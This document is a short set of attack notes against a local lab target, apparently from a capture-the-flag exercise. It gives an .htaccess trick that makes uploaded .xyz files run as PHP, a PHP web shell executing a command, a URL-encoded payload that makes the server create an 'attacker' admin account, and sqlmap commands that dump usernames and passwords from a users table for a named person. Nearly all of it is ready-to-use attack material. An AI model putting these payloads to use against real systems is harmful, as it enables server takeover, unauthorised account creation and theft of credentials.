.htaccess : AddType application/x-httpd-php .xyz

shell: 
        <?php
        define('CMD' , 'id');
        
        echo '<pre>' . exec(CMD) .'<pre>' ;
        
        ?>


csrfmiddlewaretoken=zYm4zMmaGVeYybrVlRusjVTyPoBNlR7m1pnfURIZugwEDrXgkLPLoTpnUpdmRlRj&url=http%3A%2F%2Flocalhost%3A30000%2Fv1%2Fadmin%2Fadduser%3Fusername%3Dattacker%26userid%3D56456%26email%3Dattacker.com%26phone%3D1111111%26password%3Dpass


1. Use --where
If you already know the table and column names, you can add a WHERE clause to restrict the dump:

bash
sqlmap -u "http://localhost:30000/participants.php?courseid=5" \
--cookie="PHPSESSID=v5t7jifqq5u6o5r7ndvce9an4f" \
-T users -C username,password \
--dump --where="username='Neha'" --batch
This will only dump the row(s) where username = 'Neha'.

2. Use --search + --columns
If you’re not sure of the exact column names, first run:

bash
sqlmap -u "http://localhost:30000/participants.php?courseid=5" \
--cookie="PHPSESSID=v5t7jifqq5u6o5r7ndvce9an4f" \
-T users --columns
That will list all columns in the users table. Once you know the right column (e.g., username), you can go back to the --where method above.

3. Use --sql-query
If you want full control, you can directly run a custom SQL query:

bash
sqlmap -u "http://localhost:30000/participants.php?courseid=5" \
--cookie="PHPSESSID=v5t7jifqq5u6o5r7ndvce9an4f" \
--sql-query="SELECT * FROM users WHERE username='Neha';"
This bypasses the dump mechanism and just executes your query.
